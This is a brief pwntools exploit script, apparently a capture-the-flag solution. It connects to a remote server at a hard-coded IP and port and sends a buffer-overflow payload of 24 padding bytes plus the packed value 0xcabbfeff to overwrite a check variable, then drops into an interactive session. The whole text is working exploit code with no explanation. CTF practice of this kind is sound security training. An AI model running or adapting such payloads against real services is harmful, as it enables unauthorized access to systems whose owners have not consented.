from pwn import *

#io = process('./hpbd')
io = remote('61.28.237.24', 30200)


print(io.recvuntil('?\n'))
payload = b'A'*24+p32(0xcabbfeff)
io.sendline(payload)
io.interactive()
